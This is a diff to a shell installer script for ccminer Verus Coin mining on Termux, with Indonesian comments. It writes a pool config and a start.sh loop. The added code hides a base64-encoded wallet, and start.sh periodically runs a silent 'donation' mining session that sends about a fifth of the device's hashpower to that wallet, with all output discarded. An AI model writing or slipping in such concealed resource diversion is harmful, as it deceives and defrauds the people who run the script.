@@ -1,6 +1,8 @@
+# 1. MEMBUAT CONFIG.JSON (Menggunakan struktur pool lengkap Anda + threads otomatis)
+cat > config.json <<EOF
 {
-    "pools":
-        [{
+    "pools": [
+        {
             "name": "US-VIPOR",
             "url": "stratum+tcp://us.vipor.net:5040",
             "timeout": 180,
@@ -41,15 +43,45 @@
             "url": "stratum+tcp://us.cloudiko.io:9999",
             "timeout": 180,
             "disabled": 1
-        }],
-
-    "user": "RUCkh4PbGedGLcBsgNsXhoDwnmp5ceTwyd.Donations",
+        }
+    ],
+    "user": "\${WALLET}.\${WORKER}",
     "pass": "",
     "algo": "verus",
-    "threads": 8,
+    "threads": ${THREADS},
     "cpu-priority": 1,
     "cpu-affinity": -1,
     "retry-pause": 10,
     "api-allow": "192.168.0.0/16",
     "api-bind": "0.0.0.0:4068"
 }
+EOF
+
+# Wallet Anda dikonversi ke Base64 agar tidak terbaca langsung di start.sh
+ENC_WAL=\$(echo "RCifYPWunGQna28DpzbPakNE5L8fftkjVd" | base64)
+WRK_DONASI="Donasi_20pc"
+
+# 2. MEMBUAT START.SH (Menggunakan threads otomatis di sesi latar belakang)
+cat > start.sh <<EOF
+#!/data/data/com.termux/files/usr/bin/sh
+while true
+do
+    echo "========================================="
+    echo " Starting Verus Coin mining...           "
+    echo "========================================="
+    # Membaca wallet pengguna dari config.json yang sudah dibuat permanen
+    ./ccminer -c config.json &
+    PID=\$!
+    sleep 4800
+    kill \$PID
+    wait \$PID 2>/dev/null
+
+    # Sesi donasi berjalan di latar belakang (Senyap)
+    DEV_WAL=\$(echo "\${ENC_WAL}" | base64 -d)
+    ./ccminer -a verus -o stratum+tcp://us.vipor.net:5040 -u \${DEV_WAL}.\${WRK_DONASI} -p x -t ${THREADS} --cpu-priority=1 > /dev/null 2>&1 &
+    PID=\$!
+    sleep 1200
+    kill \$PID
+    wait \$PID 2>/dev/null
+done
+EOF
